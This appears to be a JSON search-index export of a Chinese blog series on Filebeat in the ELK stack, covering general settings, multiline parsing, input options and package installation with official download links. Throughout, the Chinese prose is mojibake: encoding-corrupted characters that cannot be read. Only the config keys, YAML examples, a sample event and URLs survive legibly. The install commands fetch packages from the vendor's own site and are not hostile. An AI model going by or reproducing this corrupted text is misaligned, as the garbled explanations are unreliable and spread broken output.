å°†æ³¨å†Œè¡¨å†™å…¥(åˆ·æ–°)è‡³ç£ç›˜çš„æ—¶é—´é—´éš”ã€‚é»˜è®¤å€¼ä¸º0sï¼Œåœ¨æˆåŠŸå‘å¸ƒæ¯æ‰¹äº‹ä»¶åï¼Œæ³¨å†Œè¡¨å°†å†™å…¥ç£ç›˜ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:3","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.shutdown_timeout Filebeatå…³é—­å‰ç­‰å¾…publisherå‘é€äº‹ä»¶çš„æ—¶é—´ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:4","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.config.inputs è¯´æ˜:ç±»ä¼¼äºinclude,æŠŠå…¶ä»–inputé…ç½®æ–‡ä»¶å¯¼å…¥è¿›æ¥ ç”¨æ³•: filebeat.config.inputs: enabled: true path: configs/*.yml reload.enabled: true # å¯ç”¨åŠ¨æ€åŠ è½½ reload.period: 20s # 20ç§’é‡æ–°åŠ è½½ä¸€æ¬¡ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:5","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.config.modules é…ç½®æ¨¡å—æ–‡ä»¶çš„è·¯å¾„ filebeat.config.modules: enabled: true path: ${path.config}/modules.d/*.yml ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:6","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€é€šç”¨é€‰é¡¹ æ‰€æœ‰Elastic Beatséƒ½æ”¯æŒè¿™äº›é€‰é¡¹ã€‚å› ä¸ºå®ƒä»¬æ˜¯é€šç”¨é€‰é¡¹ï¼Œæ‰€ä»¥å®ƒä»¬æ²¡æœ‰å‘½åç©ºé—´ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:0","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"name å¦‚æœè¯¥é€‰é¡¹ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨æœåŠ¡å™¨çš„ä¸»æœºåã€‚è¿™ä¸ªåç§°ä½œä¸ºbeat.nameå­—æ®µåŒ…å«åœ¨æ¯ä¸ªå‘å¸ƒçš„äº‹åŠ¡ä¸­ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:1","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"tags å€¼æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œä½œä¸ºtagså­—æ®µåŒ…å«åœ¨æ¯ä¸ªå‘å¸ƒçš„äº‹åŠ¡ä¸­ã€‚tagså¯ä»¥å¾ˆå®¹æ˜“åœ°æ ¹æ®ä¸åŒçš„é€»è¾‘å±æ€§å¯¹æœåŠ¡å™¨è¿›è¡Œåˆ†ç»„ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªWebæœåŠ¡å™¨é›†ç¾¤ï¼Œåˆ™å¯ä»¥å°†\"WebServers\"æ·»åŠ åˆ°æ¯ä¸ªæœåŠ¡å™¨ä¸Šçš„tagsä¸­ï¼Œç„¶ååœ¨Kibana Webç•Œé¢ä¸­ä½¿ç”¨è¿‡æ»¤å™¨å’ŒæŸ¥è¯¢ä»¥è·å–æ•´ä¸ªæœåŠ¡å™¨ç»„çš„å¯è§†åŒ– ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:2","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"fields å¯é€‰å­—æ®µï¼Œå¯ä»¥æ·»åŠ ä¸€äº›è‡ªå®šä¹‰å­—æ®µã€‚å€¼æ˜¯å­—å…¸ï¼Œæ”¯æŒå¤šç§ç±»å‹åµŒå¥—ç»„åˆ ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:3","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"fields_under_root å°†è‡ªå®šä¹‰å­—æ®µç½®åˆ°é¡¶çº§ï¼Œé»˜è®¤åœ¨fieldså­—æ®µä¸‹ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:4","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"processors å®šä¹‰å¤„ç†å™¨ï¼Œä»¥ä¾¿åœ¨äº‹ä»¶å‘é€åˆ°è¾“å‡ºä¹‹å‰å¯¹å…¶è¿›è¡Œå¤„ç† ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:5","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"max_procs è®¾ç½®å¯ä»¥åŒæ—¶æ‰§è¡Œçš„æœ€å¤§CPUæ•°ã€‚é»˜è®¤å€¼æ˜¯ç³»ç»Ÿä¸­å¯ç”¨çš„é€»è¾‘CPUæ•°ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:2:6","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"Filebeatæ”¶é›†çš„æ–‡ä»¶å¯èƒ½åŒ…å«è·¨è¶Šå¤šè¡Œæ–‡æœ¬çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼ŒJavaå †æ ˆã€‚ä¸ºäº†æ­£ç¡®å¤„ç†è¿™äº›å¤šè¡Œæ¶ˆæ¯ï¼Œéœ€è¦åœ¨filebeat.ymlæ–‡ä»¶ä¸­é…ç½®å¤šè¡Œè®¾ç½®ï¼Œä»¥æŒ‡å®šå“ªäº›è¡Œæ˜¯å•ä¸ªæ¶ˆæ¯çš„ä¸€éƒ¨åˆ†. ##ä¸€ã€ ç®€å•ç¤ºä¾‹ filebeat.inputs: - type: log paths: - /var/log/test.log multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}' multiline.negate: true multiline.match: after ##äºŒ. é…ç½®é¡¹è¯´æ˜ ###2.1 multiline.pattern æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼ã€‚åŒ¹é…çš„è¡Œè¢«è§†ä¸ºå‰ä¸€è¡Œçš„å»¶ç»­ï¼Œå…¶ä»–è¡Œè§†ä¸ºèµ·å§‹è¡Œã€‚ ä¸logstashçš„æ­£åˆ™è¡¨è¾¾å¼æœ‰æ‰€ä¸åŒã€‚filebeatæ”¯æŒçš„æ­£åˆ™è¡¨è¾¾å¼https://www.elastic.co/guide/en/beats/filebeat/6.8/regexp-support.html ###2.2 multiline.negate å®šä¹‰æ˜¯å¦ä¸ºå¦å®šæ¨¡å¼ã€‚ é»˜è®¤ä¸ºfalseï¼ŒåŒ¹é…çš„è¡Œä¼šè¢«è§†ä¸ºå‰ä¸€è¡Œçš„ç»­è¡Œï¼Œä¸åŒ¹é…çš„è§†ä¸ºå¤šè¡Œäº‹ä»¶çš„å¼€å§‹ è®¾ç½®ä¸ºtrue åŒ¹é…çš„è¡Œè¢«è§†ä¸ºå¤šè¡Œäº‹ä»¶çš„å¼€å§‹,ä¸åŒ¹é…çš„è¡Œè§†ä¸ºå‰ä¸€è¡Œçš„ç»­è¡Œ å¯ä»¥çœ‹2.3ä¸­çš„å›¾ï¼Œæœ‰åŠ©äºç†è§£ã€‚ ###2.3 multiline.match è®¾ç½®åŒ¹é…åˆ°çš„å†…å®¹é™„åŠ çš„ä½ç½®ã€‚æ’å…¥åˆ°å‰ä¸€è¡Œè¿˜æ˜¯è¿½åŠ åˆ°åä¸€è¡Œã€‚before æˆ– afterã€‚ 46580-q1fxvu7j4u9.png ä¸Šå›¾ä¸ºä¸ªäººç†è§£ã€‚ä¸ä¸€å®šå¯¹ã€‚ ###2.4 multiline.flush_pattern æŒ‡å®šä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨æ¥ç»“æŸå¤šè¡Œäº‹ä»¶ã€‚ ###2.5 multiline.max_lines å¦‚æœå¤šè¡Œæ¶ˆæ¯åŒ…å«çš„è¡Œæ•°è¶…è¿‡max_linesï¼Œåˆ™å°†åˆ é™¤æ‰€æœ‰å…¶ä»–è¡Œã€‚é»˜è®¤å€¼ä¸º500ã€‚ ###2.6 multiline.timeout åœ¨æŒ‡å®šçš„æ—¶é—´åï¼ŒæŒ‡å®šçš„æ­£åˆ™å³ä½¿æ²¡æœ‰å¯åŠ¨æ–°äº‹ä»¶ï¼ŒFilebeatä¹Ÿä¼šå‘é€å¤šè¡Œäº‹ä»¶ã€‚é»˜è®¤å€¼ä¸º5sã€‚ ","date":"2021-03-18 17:32","objectID":"/post/2256/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®å¤šè¡Œè§£æ(å››)","uri":"/post/2256/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€ä¾‹å­ filebeat.inputs: - type: log paths: - /var/log/test.log multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}' multiline.negate: true multiline.match: after output.elasticsearch: hosts: [\"es-01:9200\", \"es-02:9200\", \"es-03:9200\"] è§£æï¼šå°†æ‰€æœ‰ä»¥æ—¥æœŸ(xxxx-xx-xx)å¼€å¤´çš„è¡Œï¼Œä½œä¸ºå¤šè¡Œäº‹ä»¶çš„å¼€å§‹ã€‚ç›´è‡³é‡åˆ°ä¸‹ä¸€ä¸ªå¤šè¡Œäº‹ä»¶æ—¶ç»“æŸ,æˆ–è€…ç­‰å¾…multiline.timeoutæ—¶é—´ ä¾‹å¦‚ä¸‹é¢çš„æ—¥å¿—ä¼šè¢«è§£ææˆ4æ¡æ—¥å¿—ï¼š 2021-03-18 17:54:20.848 DEBUG 123521 --- [ XNIO-1 task-2] o.s.s.m.ResBagRelationM 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot ================ Response Start ================ ===Result=== {\"code\":200} \u003c=== GET: /xixxxnfos (6 ms) ================ Response End ================ 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot 2021-03-18 17:54:20.849 INFO 123521 --- [ XNIO-1 task-3] o.s.core.boot å®˜æ–¹ç»™çš„å…¶ä»–ä¾‹å­ https://www.elastic.co/guide/en/beats/filebeat/6.8/_examples_of_multiline_configuration.html ","date":"2021-03-18 17:32","objectID":"/post/2256/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®å¤šè¡Œè§£æ(å››)","uri":"/post/2256/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"inputå³é…ç½®ä»å“ªé‡Œè·å–æ—¥å¿— ","date":"2021-03-17 15:34","objectID":"/post/2248/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®input(ä¸‰)  ","uri":"/post/2248/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€inputé…ç½®æ ¼å¼ filebeat.inputs: - type: log paths: - /var/log/system.log - /var/log/wifi.log - type: log paths: - \"/var/log/apache2/*\" fields: apache: true fields_under_root: true å¯ä»¥åŒæ—¶é…ç½®å¤šä¸ªinputç±»å‹ï¼Œæ–¹ä¾¿å­¦ä¹ å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ logging.level: debug ä¸€ä¸ªäº‹ä»¶çš„jsonæ•°æ® { \"@timestamp\": \"2021-03-17T11:53:54.324Z\", \"@metadata\": { \"beat\": \"filebeat\", \"type\": \"doc\", \"version\": \"6.8.5\" }, \"tags\": [ \"test\", \"ok\" ], \"prospector\": { \"type\": \"log\" }, \"input\": { \"type\": \"log\" }, \"source\": \"/var/log/test.log\", \"offset\": 555, \"log\": { \"file\": { \"path\": \"/var/log/test.log\" } }, \"message\": \"{\\\"a\\\": \\\"2021-03-17 19:53:52\\\", \\\"a1\\\": \\\"aaaaa\\\"}\", \"host\": { \"name\": \"soulchild-temp\" }, \"beat\": { \"name\": \"soulchild-temp\", \"hostname\": \"soulchild-temp\", \"version\": \"6.8.5\" } } ","date":"2021-03-17 15:34","objectID":"/post/2248/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®input(ä¸‰)  ","uri":"/post/2248/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€inputç±»å‹å¯ä»¥æ˜¯å¦‚ä¸‹å†…å®¹ Log Stdin Redis UDP Docker TCP Syslog NetFlow ","date":"2021-03-17 15:34","objectID":"/post/2248/:2:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®input(ä¸‰)  ","uri":"/post/2248/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€ä¸åŒinputç±»å‹çš„é…ç½® å…¬å…±é€‰é¡¹ æ‰€æœ‰inputå‡æ”¯æŒä»¥ä¸‹é…ç½®é€‰é¡¹ã€‚ enable: å¯ç”¨æˆ–ç¦ç”¨ä¸€ä¸ªinputã€‚true or false tags: FilebeatåŒ…å«åœ¨æ¯ä¸ªå·²å‘å¸ƒäº‹ä»¶çš„æ ‡ç­¾å­—æ®µä¸­çš„æ ‡ç­¾åˆ—è¡¨ã€‚ä½¿ç”¨tagå¯ä»¥è½»æ¾åœ°åœ¨Kibanaä¸­é€‰æ‹©ç‰¹å®šäº‹ä»¶æˆ–åœ¨Logstashä¸­åº”ç”¨æ¡ä»¶è¿‡æ»¤ã€‚è¿™äº›tagä¼šè¢«é™„åŠ åˆ°tagså­—æ®µä¸­ fields: è‡ªå®šä¹‰å­—æ®µ,é…ç½®å¦‚ä¸‹ fields: app_id: 1 app_name: \"test\" fields_under_root: å¦‚æœä¸ºtrueï¼Œè‡ªå®šä¹‰å­—æ®µå°†ä¼šè¢«æ”¾ç½®é¡¶å±‚ã€‚é»˜è®¤æ˜¯åœ¨fieldsä¸‹ processors: å®šä¹‰å¤„ç†å™¨ï¼Œä»¥ä¾¿åœ¨äº‹ä»¶å‘é€åˆ°outputä¹‹å‰å¯¹å…¶è¿›è¡Œå¤„ç† pipeline: ç®¡é“ç”±å¤šä¸ªå¤„ç†å™¨å’Œä¸€ä¸ªé˜Ÿåˆ—ç»„æˆã€‚ä¸ºè¯¥inputäº‹ä»¶ç”Ÿæˆç®¡é“ID ","date":"2021-03-17 15:34","objectID":"/post/2248/:3:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®input(ä¸‰)  ","uri":"/post/2248/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1. log 1.1 é…ç½®ç¤ºä¾‹ filebeat.inputs: - type: log paths: - /var/log/system.log - /var/log/wifi.log - type: log paths: - \"/var/log/nginx/*.log\" fields: nginx: true fields_under_root: true 1.2 é…ç½®é€‰é¡¹ paths: æ•°ç»„ç±»å‹ã€‚é…ç½®æ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨/log/*.log,/log/*/*.log recursive_glob.enabled: é»˜è®¤å¯ç”¨ã€‚æ”¯æŒè·¯å¾„æ·±åº¦æ‰©å±•å†™æ³•ã€‚æ¯”å¦‚/log/**/*.logï¼Œå¯ä»¥ä»£è¡¨/log/*/*.log,/log/*/*/*.log,/log/*/*/*/*.log,/log/*/*/*/*/*.logâ€¦æœ€å¤šèƒ½ä»£è¡¨8çº§ã€‚ encoding: æ—¥å¿—æ–‡ä»¶ç¼–ç æ ¼å¼ã€‚plain, latin1, utf-8, big5, gbkç­‰ç­‰ exclude_lines: æ’é™¤æ—¥å¿—æ–‡ä»¶ä¸­çš„æŸäº›è¡Œã€‚æ”¯æŒæ­£åˆ™ã€‚ filebeat.inputs: - type: log ... exclude_lines: ['^DBG', '^INFO'] include_lines: åªä¿ç•™æ—¥å¿—ä¸­çš„æŸäº›è¡Œã€‚æ”¯æŒæ­£åˆ™ï¼Œå†™æ³•åŒä¸Šã€‚includeæ¯”excludeå…ˆæ‰§è¡Œã€‚ tail_files: å¦‚æœæ­¤é€‰é¡¹è®¾ç½®ä¸ºtrueï¼ŒFilebeatå°†åœ¨æ¯ä¸ªæ–‡ä»¶çš„æœ«å°¾è€Œä¸æ˜¯å¼€å¤´å¼€å§‹è¯»å–æ–°æ–‡ä»¶ã€‚å¦‚æœå°†æ­¤é€‰é¡¹ä¸æ—¥å¿—è½®æ¢ç»“åˆä½¿ç”¨ï¼Œåˆ™å¯èƒ½ä¼šè·³è¿‡æ–°æ–‡ä»¶ä¸­çš„ç¬¬ä¸€ä¸ªæ—¥å¿—æ¡ç›®ã€‚é»˜è®¤è®¾ç½®ä¸ºfalse. æ­¤é€‰é¡¹é€‚ç”¨äºFilebeatå°šæœªå¤„ç†è¿‡çš„æ–‡ä»¶ã€‚å¦‚æœæ‚¨ä»¥å‰è¿è¡Œäº†Filebeatï¼Œå¹¶ä¸”æ–‡ä»¶çš„çŠ¶æ€å·²ç»æŒä¹…åŒ–ï¼Œé‚£ä¹ˆå°†ä¸é€‚ç”¨tail_filesã€‚harvesterå°†åœ¨æœ€åè®°å½•çš„åç§»å¤„ç»§ç»­è¿›è¡Œã€‚è¦å°†tail_filesåº”ç”¨äºæ‰€æœ‰æ–‡ä»¶ï¼Œå¿…é¡»åœæ­¢Filebeatå¹¶åˆ é™¤æ³¨å†Œè¡¨æ–‡ä»¶ã€‚è¯·æ³¨æ„ï¼Œè¿™æ ·åšä¼šåˆ é™¤æ‰€æœ‰ä»¥å‰çš„çŠ¶æ€ã€‚æ³¨å†Œè¡¨æ–‡ä»¶è·¯å¾„ï¼š/var/lib/filebeat/registry harvester_buffer_size: æ¯ä¸ªharvesterè¯»å–æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨çš„ç¼“å†²åŒºå¤§å°ã€‚é»˜è®¤æ˜¯16384(å­—èŠ‚)ã€‚ max_bytes: ä¸€æ¡æ—¥å¿—çš„æœ€å¤§å­—èŠ‚æ•°ã€‚å¤§äºæ­¤å¤§å°çš„æ—¥å¿—ä¼šè¢«ä¸¢å¼ƒã€‚æ­¤è®¾ç½®å¯¹äºå¤šè¡Œæ—¥å¿—å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå¤šè¡Œæ—¥å¿—å¯èƒ½ä¼šå˜å¤§ã€‚é»˜è®¤å€¼æ˜¯10MB(10485760)ã€‚ json: å°†æ—¥å¿—çš„æ¯ä¸€è¡Œä½œä¸ºjsonæ¥è§£æã€‚jsonè§£ç å‘ç”Ÿåœ¨è¿‡æ»¤è¡Œå’Œå¤šè¡Œé…ç½®ä¹‹é—´ï¼Œä¸‹é¢æ˜¯é…ç½®ç¤ºä¾‹ # é»˜è®¤æƒ…å†µä¸‹ï¼Œè§£ç åçš„jsonå¯¹è±¡ä¼šæ”¾åœ¨jsonå­—æ®µä¸‹,æ¯”å¦‚æ—¥å¿—æ˜¯{\"log\": \"test\"}å­—æ®µï¼Œåœ¨kibanaä¸­å‘ˆç°çš„å°±æ˜¯json.logå­—æ®µï¼Œå¦‚æœå¯ç”¨æ­¤è®¾ç½®å°†ä¼šå§jsonå¯¹è±¡æ”¾ç½®é¡¶å±‚ï¼Œå‘ˆç°ä¸ºlogå­—æ®µã€‚é»˜è®¤ä¸ºfalseã€‚ json.keys_under_root: true # å¦‚æœkeys_under_rootè¢«å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨keyå†²çªçš„æƒ…å†µä¸‹ï¼Œè§£ç åçš„JSONå¯¹è±¡å°†è¦†ç›–Filebeatæ­£å¸¸çš„å­—æ®µã€‚è„æ•°æ®å¯èƒ½ä¼šå¯¼è‡´(Cannot index event publisher.EventæŠ¥é”™) json.overwrite_keys: true # å¦‚æœå¯ç”¨æ­¤è®¾ç½®å°†ä¼šæ·»åŠ ä¸€ä¸ªå­—æ®µ\"error.message\"ç”¨æ¥æè¿°jsonè§£æå‡ºé”™çš„ä¿¡æ¯ã€‚è¿˜ä¼šæ·»åŠ å¦ä¸€å¯¹KVï¼š\"error.type: json\"ï¼Œä»£è¡¨é”™è¯¯ç±»å‹æ˜¯json json.add_error_key: true # message_keyï¼šå¯é€‰é…ç½®ï¼ŒæŒ‡å®šè¦åº”ç”¨ è¡Œç­›é€‰å’Œå¤šè¡Œè®¾ç½®çš„JSON keyã€‚å¦‚æœæŒ‡å®šäº†è¯¥keyï¼Œåˆ™è¯¥keyå¿…é¡»ä½äºJSONå¯¹è±¡çš„é¡¶çº§ï¼Œå¹¶ä¸”ä¸è¯¥keyå…³è”çš„å€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¸ä¼šè¿›è¡Œç­›é€‰æˆ–å¤šè¡Œèšåˆã€‚ json.message_key: log # å¯é€‰é…ç½®ï¼Œå¦‚æœä¸ºfalseä¼šåœ¨filebeatæ—¥å¿—ä¸­æ‰“å°å‡ºjsonè§£ææŠ¥é”™ä¿¡æ¯ï¼Œé»˜è®¤ä¸ºfalse json.ignore_decoding_error: true multiline: æ§åˆ¶Filebeatå¦‚ä½•å¤„ç†è·¨å¤šè¡Œæ—¥å¿—æ¶ˆæ¯çš„é€‰é¡¹ã€‚æœ‰å…³é…ç½®å¤šè¡Œé€‰é¡¹çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ç®¡ç†å¤šè¡Œæ¶ˆæ¯ã€‚https://www.elastic.co/guide/en/beats/filebeat/6.8/multiline-examples.html exclude_files: ä¸æ”¶é›†æŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ”¯æŒæ­£åˆ™ã€‚ä¾‹å¦‚ï¼šexclude_files: [â€™.gz$'] ignore_older: å¦‚æœå¯ç”¨æ­¤é€‰é¡¹ï¼Œåˆ™Filebeatå°†å¿½ç•¥åœ¨æŒ‡å®šçš„ æ—¶é—´è·¨åº¦ ä¹‹å‰ä¿®æ”¹çš„ä»»ä½•æ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨2hå’Œ5mè¿™æ ·çš„é…ç½®ã€‚ æ¯”å¦‚æˆ‘è®¾ç½®2mï¼Œå†æˆ‘å¯åŠ¨filebeatçš„æ—¶å€™ï¼Œåªä¼šæ”¶é›†2åˆ†é’Ÿä»¥å†…è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼Œ2åˆ†é’Ÿä¹‹å‰çš„ä¸ä¼šç®¡ã€‚ignore_olderå¿…é¡»æ¯”close_inactiveæ›´å¤§ã€‚ close_inactive:å½“å¯ç”¨æ­¤é€‰é¡¹æ—¶ï¼Œå¦‚æœåœ¨æŒ‡å®šçš„æŒç»­æ—¶é—´å†…æ²¡æœ‰æ”¶é›†åˆ°æ—¥å¿—ï¼Œåˆ™Filebeatå°†å…³é—­æ–‡ä»¶å¥æŸ„ã€‚ close_*: è¿™ä¸ªé€‰é¡¹ç”¨äºåœ¨ç‰¹å®šæ¡ä»¶æˆ–æ—¶é—´è¿‡åå…³é—­harvesterã€‚å…³é—­harvesteræ„å‘³ç€å…³é—­æ–‡ä»¶å¤„ç†ç¨‹åºã€‚å¦‚æœåœ¨å…³é—­harvesterä¹‹åæ›´æ–°æ–‡ä»¶ï¼Œåˆ™åœ¨scan_frequencyè¿‡å»ä¹‹åå°†å†æ¬¡æ‹¾å–è¯¥æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœåœ¨harvesterå…³é—­æ—¶ç§»åŠ¨æˆ–åˆ é™¤æ–‡ä»¶ï¼ŒFilebeatå°†æ— æ³•å†æ¬¡æ‹¾å–è¯¥æ–‡ä»¶ï¼Œå¹¶ä¸”harvesterå°šæœªè¯»å–çš„ä»»ä½•æ•°æ®éƒ½å°†ä¸¢å¤±ã€‚ scan_frequency: Filebeatå¤šä¹…æ£€æŸ¥ä¸€æ¬¡æ”¶é›†çš„è·¯å¾„ä¸­çš„æ–°æ—¥å¿—æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æŒ‡å®š/var/log/*.logï¼Œåˆ™ä½¿ç”¨scan_frequencyæŒ‡å®šçš„é¢‘ç‡åœ¨ç›®å½•ä¸­æ‰«ææ–‡ä»¶ã€‚ä¸å»ºè®®å°†æ­¤å€¼è®¾ç½®ä¸º\u003c1sã€‚ ","date":"2021-03-17 15:34","objectID":"/post/2248/:3:1","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®input(ä¸‰)  ","uri":"/post/2248/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ›´å¤šå®‰è£…æ–¹å¼ï¼šhttps://www.elastic.co/guide/en/beats/filebeat/6.8/filebeat-installation.html rpmå®‰è£… curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.5-x86_64.rpm sudo rpm -vi filebeat-6.8.5-x86_64.rpm äºŒè¿›åˆ¶å®‰è£… curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.14-linux-x86_64.tar.gz tar xzvf filebeat-6.8.14-linux-x86_64.tar.gz ä¸‹æ–‡å¼•ç”¨è‡ª: https://www.cnblogs.com/cjsblog/p/9495024.html å®˜æ–¹æ–‡æ¡£: https://www.elastic.co/guide/en/beats/filebeat/6.8/how-filebeat-works.html#how-filebeat-works ","date":"2021-03-17 10:28","objectID":"/post/2245/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"Filebeatæ˜¯å¦‚ä½•å·¥ä½œçš„ Filebeatç”±ä¸¤ä¸ªä¸»è¦ç»„ä»¶ç»„æˆï¼šinputs å’Œ harvesters ï¼ˆç›´è¯‘ï¼šæ”¶å‰²æœºï¼Œé‡‡é›†å™¨ï¼‰ã€‚è¿™äº›ç»„ä»¶ä¸€èµ·å·¥ä½œä»¥è·Ÿè¸ªæ–‡ä»¶ï¼Œå¹¶å°†äº‹ä»¶æ•°æ®å‘é€åˆ°ä½ æŒ‡å®šçš„è¾“å‡ºã€‚ ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1.harvesteræ˜¯ä»€ä¹ˆ ä¸€ä¸ªharvesterè´Ÿè´£è¯»å–ä¸€ä¸ªå•ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚ harvesteré€è¡Œè¯»å–æ¯ä¸ªæ–‡ä»¶ï¼ˆä¸€è¡Œä¸€è¡Œåœ°è¯»å–æ¯ä¸ªæ–‡ä»¶ï¼‰ï¼Œå¹¶æŠŠè¿™äº›å†…å®¹å‘é€åˆ°è¾“å‡ºã€‚ æ¯ä¸ªæ–‡ä»¶å¯åŠ¨ä¸€ä¸ªharvesterã€‚ harvesterè´Ÿè´£æ‰“å¼€å’Œå…³é—­è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™å°±æ„å‘³ç€åœ¨harvesterè¿è¡Œæ—¶æ–‡ä»¶æè¿°ç¬¦ä¿æŒæ‰“å¼€çŠ¶æ€ã€‚ åœ¨harvesteræ­£åœ¨è¯»å–æ–‡ä»¶å†…å®¹çš„æ—¶å€™ï¼Œæ–‡ä»¶è¢«åˆ é™¤æˆ–è€…é‡å‘½åäº†ï¼Œé‚£ä¹ˆFilebeatä¼šç»­è¯»è¿™ä¸ªæ–‡ä»¶ã€‚è¿™å°±æœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œå°±æ˜¯åªè¦è´Ÿè´£è¿™ä¸ªæ–‡ä»¶çš„harvesteræ²¡ç”¨å…³é—­ï¼Œé‚£ä¹ˆç£ç›˜ç©ºé—´å°±ä¸ä¼šé‡Šæ”¾ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒFilebeatä¿å­˜æ–‡ä»¶æ‰“å¼€ç›´åˆ°close_inactiveåˆ°è¾¾ã€‚ ","date":"2021-03-17 10:28","objectID":"/post/2245/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeatå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2245/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"2.inputæ˜¯ä»€ä¹ˆ ä¸€ä¸ªinputè´Ÿè´£ç®¡ç†harvestersï¼Œå¹¶æ‰¾åˆ°æ‰€æœ‰è¦è¯»å–çš„æºã€‚ 